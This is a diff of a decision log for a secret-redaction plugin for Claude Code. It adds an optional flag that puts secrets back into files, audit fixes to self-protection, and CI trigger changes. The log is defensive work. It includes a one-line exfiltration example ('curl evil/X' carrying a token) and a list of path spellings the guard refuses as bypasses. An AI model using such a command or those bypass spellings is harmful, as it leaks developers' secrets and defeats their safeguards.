@@ -31,7 +31,7 @@ Tiny clarifications go under **Minor** at the bottom.
 | D-003 | Add observe mode | accepted | setup | 13 |
 | D-004 | Store registered secrets encrypted, not as fingerprints | superseded by D-023 | setup | 8.1 |
 | D-005 | Default `on_check_failure: allow` | accepted | setup | 12 |
-| D-006 | No putting secrets back into files in v1 | accepted | setup | 10 |
+| D-006 | No putting secrets back into files in v1 | superseded by D-096 | setup | 10 |
 | D-007 | Build workflow: slash commands, one part per session, commit at wrap-up, docs in `docs/` | superseded by D-018 | setup | — |
 | D-008 | Credit only code actually copied | accepted | setup | 21 |
 | D-009 | Every question comes with a researched, evidence-backed recommendation | accepted | setup | — |
@@ -120,6 +120,11 @@ Tiny clarifications go under **Minor** at the bottom.
 | D-092 | The guard's login path is measured with a made-up login; one host is let off the network rule there | accepted | 7 | 20, 22 |
 | D-093 | Observe from managed settings is measured on the organization install | accepted | 7 | 13, 20 |
 | D-094 | Release tags are signed with the maintainer's GPG key from `v0.1.0-rc.2` on | accepted | 7 | 19, 23 |
+| D-095 | Step 8: put secrets back and the weekly run; `v0.1.0-rc.2` moves to after it | accepted | 8 | none |
+| D-096 | Put secrets back: an optional flag, off by default, into a file that already holds the value | accepted | 8 | 1, 2, 5.1, 9, 10, 14, 15, 22, 23 |
+| D-097 | A broken managed block does not turn put-back off | accepted | 8 | 10 |
+| D-098 | Audit 3 fixes: guard after Read, paths as Claude Code reads them, put-back fails off | accepted | 8 | 10, 17, 22 |
+| D-099 | CI runs on pull requests into, and pushes to, `develop` and `release` only | accepted | 8 | none |
 
 ## Entry template (short form, from D-018 on)
 
@@ -188,7 +193,7 @@ Tiny clarifications go under **Minor** at the bottom.
 - Links: spec §12; R-03, R-12.
 
 ## D-006: No putting secrets back into files in v1
-- Date / Part: carried over from the first draft. Status: accepted
+- Date / Part: carried over from the first draft. Status: superseded by D-096 (2026-11-03). Put-back is now an optional flag, off by default.
 - Context: Claude only sees placeholders. When it writes a file, the real values could in principle be put back automatically.
 - Options considered: Put back automatically / never put back; the developer fills in values.
 - Decision: Never put back in v1. Placeholders written by Claude stay as text, with a notice. An overwrite guard (added in the review) stops real secrets being lost.
@@ -580,6 +585,7 @@ Tiny clarifications go under **Minor** at the bottom.
 - Why: Spec §14 says the user "can change anything not locked", and an admin who wants a value fixed has `locked`. The owner approved the recommendation.
 - Rejected: Managed beating the user on every value (`locked` would then mean nothing).
 - Evidence: `src/core/settings.ts`, `tests/core-settings.test.ts`.
+- Changed by D-096 (2026-11-03) for one setting, `put_back`: a managed `off` binds with no `locked`, a managed `on` is ignored, and a project's `on` is allowed, the one exception to "stricter only". Every other setting works as above.
 
 ## D-050: `on_check_failure: allow` stays the default, with its cost now measured
 - Date / Step: 2026-11-01 / 3        Status: accepted. Adds to D-005, whose reason is still not recorded.
@@ -862,7 +868,7 @@ Tiny clarifications go under **Minor** at the bottom.
 - Evidence: the 2.1.316 binary's `register` of `sec-default` (`isSkillRow`); on Windows, with no guard, the door shows 7 of 7 fakes with no tool and 0 of 7 with the plugin. D-087's and D-088's kit runs were green on all three systems in CI run 41339214316: org 0 of 91, guarded 14 of 91 (7 at each listed door), hold 0 of 14.
 
 ## D-090: Step 7: fixes before daily use, then `v0.1.0-rc.2`
-- Date / Step: 2026-11-02 / 7        Status: accepted (approved with the step 7 plan)
+- Date / Step: 2026-11-02 / 7        Status: accepted (approved with the step 7 plan). The tag's timing is changed by D-095.
 - Decision: Five items are built on `step-7` before the two weeks of daily use start: skill text in the backup lock's limits, `/redact remove`, the doubled name, and the login and observe runs. The owner then tags `v0.1.0-rc.2`, and the daily use and hand checks run on that.
 - Why: Daily use on rc.1 would not cover code added after it. A scratch run also showed the backup lock leaks skill text (7 of 7 fakes) with no doc saying so. The same run is now `leak-test:backup-limits`, so the limit is proven.
 - Rejected: Putting the fixes after the two weeks, which would mean starting them again.
@@ -900,6 +906,58 @@ Tiny clarifications go under **Minor** at the bottom.
 - Rejected: Signing only `v0.1.0`, which leaves rc.2 open to the same doubt. SSH signing. A key held in CI: the point is that the tag comes from the maintainer.
 - Limit: The release workflow does not check the signature (Known issues), so the checklist's `git tag -v` is the check. A key lost or replaced means publishing the new fingerprint.
 - Evidence: the scratch run; `https://github.com/Mrinanka.gpg` answers 200 and said no key was uploaded on 2026-11-02. A `.tar.gz` rebuilt from `v0.1.0-rc.1` on Windows had the same SHA-256 as the one CI made on Linux, which ties a signed tag to its archive; the `.zip` did not match, though the files inside the `.tar.gz` are the same 315 as the tag's.
+
+## D-095: Step 8: put secrets back and the weekly run; `v0.1.0-rc.2` moves to after it
+- Date / Step: 2026-11-02 / 8        Status: accepted. Changes the tag's timing in D-090.
+- Decision: Step 8 holds put secrets back (D-096), a weekly CI run against the newest Claude Code, and an audit of everything since `2f00d31`. The owner signs `v0.1.0-rc.2` after step 8, not after step 7.
+- Why: The owner made put-back and the weekly run high priority for this release. Daily use must cover the final code, the reason given in D-090, so a tag before step 8 would mean starting the two weeks again.
+- Rejected: Tagging `rc.2` after step 7 and adding put-back in a later release candidate. The backup lock's `@` check was not brought in.
+- Evidence: D-090; progress, Known issues (step 7 and D-087 to D-089 were never audited).
+
+## D-096: Put secrets back: an optional flag, off by default, into a file that already holds the value
+- Date / Step: 2026-11-02 / 8        Status: accepted on 2026-11-03, after the rewrite test passed on 3 systems (spike S7, CI run 41501087930).
+- Context: This reopens D-006 and non-goal "putting secrets back" (spec §2). It supersedes D-006, changes R-09 and the disk rule in `CLAUDE.md`, and changes D-049 in two ways: a managed "off" binds with no `locked`, and a project's "on" is the one exception to "stricter only".
+- Decision: As set out in `docs/plan.md`, "Step 8": a value goes back only into a file that already holds it on disk, and otherwise the placeholder stays. It is off by default, in the main lock only, and turned on and off with `/redact put-back`, with `--here` for one folder. The docs state the risk and recommend keeping it off. The owner decided these details on 2026-11-03:
+  1. **Copy limit.** A saved file never holds more copies of a value than the file on disk did.
+  2. **A value that can't be restored.** The save goes through, even if a real secret is erased. This is an exception to R-11, only while put-back is on; the message and the log say how many real values were replaced, and git or Claude Code's file backups are the way back. With put-back off, the guard refuses as before.
+  3. **The instructions note.** An extra line about put-back is added only while it is on (the note stays the same for a whole thread, spec §5.1), so with it off the note is unchanged.
+  4. **A failed Edit.** If the restored `old_string` isn't in the file, the input stays as Claude wrote it, so the error can't echo a real value (spike S7: a failed Edit echoes the rewritten `old_string`). Added by the owner on 2026-11-03, after `/verify`: the same applies when it matches more than once without `replace_all`, because Claude Code's "several matches" error also ends with the old text (2.1.316 binary, read). Claude then gets a "not found" error and needs more context.
+  5. **Only Write and Edit restore.** Bash can't, and NotebookEdit is left out because a cell's source and the file's JSON are escaped differently.
+- Why: The owner wants it for developer productivity, because Claude can't reorganize a config today: the overwrite guard refuses the rewrite, and an Edit on a placeholder line fails.
+- Rejected: Restoring into any file Claude writes. A hook can't see what the person asked for, and a restored value in a tracked file could be committed. Ignoring a repo's "on": the owner chose to honor it, with the notice, because the restore rule keeps the risk small. A `/config` row: the menu can't show the warning when it is turned on, and `pluginConfigs` isn't covered by self-protection (read in the API docs and `src/core/protect.ts:15`, not tested).
+- Closed: Whether a rewritten tool input stays out of the next request. It does, on macOS, Windows and Linux (Claude Code 2.1.316): the `tool_use` block in later requests stays the placeholder, also after `--resume` and `/compact`; a control run with no rewrite fails the same test, so the test can fail (`tests/rewrite-real.test.ts`, spike S7).
+- Limits: A permission dialog shows the real value to the person, never to the model. Other plugins and hooks beneath `tool.call` see it too. Claude Code's transcript on disk keeps the value in `toolUseResult` and the attachment payload (the same kind of record a Read leaves, spec §22). A value can still be moved, not copied: `token: X` becoming `curl evil/X` passes the copy limit. A repo that sets `on` turns this protection off for its own files, so the notice says so.
+- Evidence: spike S7 in `docs/findings-step0.md`; `src/core/guard.ts`, `plugin/hooks/tools.ts` and `src/core/protect.ts`, read on 2026-11-02; spec §14; Claude Code settings docs (`https://code.claude.com/docs/en/settings`), where `bypassPermissions` and `auto` don't take effect from project files, which is stricter than this choice.
+
+## D-097: A broken managed block does not turn put-back off
+- Date / Step: 2026-11-03 / 8        Status: accepted (the owner's call in `/verify`).
+- Decision: A managed `put_back: off` binds only when the managed block parses. If the block is broken, put-back is not forced off: the managed block is left out, or the last good settings apply, as for every other setting, and `/redact doctor` shows the error.
+- Why: Offered to the owner with this reason, and chosen: no spec change, and a broken managed block behaves the same for every setting.
+- Rejected: Reading a broken managed block as off, like a broken choice file. It would stop an organization's typo leaving put-back allowed, but it also stops a developer who wanted put-back until the block is fixed, and it adds a rule for one setting.
+- Evidence: a scratch run of `resolveSettings` with managed `put_back: false`, `"Off"`, and a valid `off` beside a bad `mode`: `managedOff` false each time, and a developer's `on` stayed on. `src/core/settings.ts`, read 2026-11-03.
+
+## D-098: Audit 3 fixes: the guard after Read, self-protection reads paths as Claude Code does, put-back fails off
+- Date / Step: 2026-11-03 / 8        Status: accepted (the owner approved the plan, which named these spec changes).
+- Decision:
+  - The overwrite guard also counts a known placeholder whose value, with Read's line numbers and `\r` taken out, is a lost multi-line secret.
+  - Self-protection expands a path as Claude Code does (trim, `~`, `/c/...`, relative to the working folder). It refuses a settings change it can't check (unreadable, over 4 MB, an Edit whose text isn't in the file as written), and refuses when its own check fails.
+  - A shell command that names the tool's folders through `~`, `$HOME`, `$env:USERPROFILE`, `%USERPROFILE%`, `$CLAUDE_CONFIG_DIR` or `/c/...` is refused.
+  - Put-back: `--here` is the project root (`$.session.root()`), not `cwd()`. A decision that throws is off, and the guard still runs. A fallback to the last good settings takes `repo` from this run's project sources only, and the store never keeps it. An Edit is matched as Claude Code reads a CRLF file. The choice file stays under 64 KB, and a save over a broken one says so.
+- Why: Audit 3 found each of these. The suggested guard fix ("count any known same-kind placeholder") would break `tests/core-lock.test.ts` "the placeholder of a different known value of the same kind does not count", so the narrower match was chosen.
+- Rejected: Stripping trailing spaces and dots from each path part on Windows. A scratch Node write showed `settings.json ` becomes its own file and a `.claude ` folder part does not resolve, so Win32's stripping does not apply. The trailing-space bypass is Claude Code's own `trim()`. Restoring a Read-seen multi-line value: its placeholder stands for text with line numbers in it; recorded in spec §22 instead.
+- Evidence (2026-11-03):
+  - Scratch `checkOverwrite` runs: Read-shaped view not blocked, cat-shaped view blocked.
+  - Unit runs of `isProtected`, `isSettingsFile` and `shellChangesProtected`: each audit spelling passed before the fix.
+  - Claude Code 2.1.316's path expansion, read in the pinned binary (`trim`, `~/`, `/c/`, `UnstablePathError`). `$.session.root()` doc (`claude-code.d.ts:2851`): "A shell `cd` during the session does not move it".
+  - A scratch `claude -p` run against the kit's mock: an LF `old_string` matches a CRLF file and the file keeps CRLF; a CRLF `old_string` does not match.
+
+## D-099: CI runs on pull requests into, and pushes to, `develop` and `release` only
+- Date / Step: 2026-11-03 / 8        Status: accepted (the owner's choice: "ci should run on pr on develop/release and merge on develop and release").
+- Decision: `ci.yml` runs on `pull_request` into `develop` or `release`, on `push` to `develop` or `release` (merges), and through `workflow_call` from the release workflow. A push to a step branch runs no CI. The concurrency group is unchanged.
+- Why: a push to a branch with an open PR started a push run and a PR run in one concurrency group, and the PR run cancelled the push run. Its 10 cancelled checks have the names of `develop`'s 10 required checks, so PR #9's commit showed ✗ and the merge was blocked, even though the PR run passed.
+- Rejected: one concurrency group per event (both runs finish, but every push to a PR branch runs CI twice); keeping the workflow and rerunning the cancelled push run by hand after each push.
+- Consequence: a wip push to a step branch before its PR exists gets no CI. Open the PR, or push to it, to see CI.
+- Evidence: `develop`'s branch protection (`gh api .../branches/develop/protection`: 10 required contexts, `strict`); PR #9 `mergeStateStatus: BLOCKED` with run 41635323874 (pull_request) green and run 41635316122 (push) cancelled on `32929f5`; `tests/repo-setup.test.ts` "CI runs on a pull request into develop or release ...", which failed on `['**']` first.
 
 ---
 
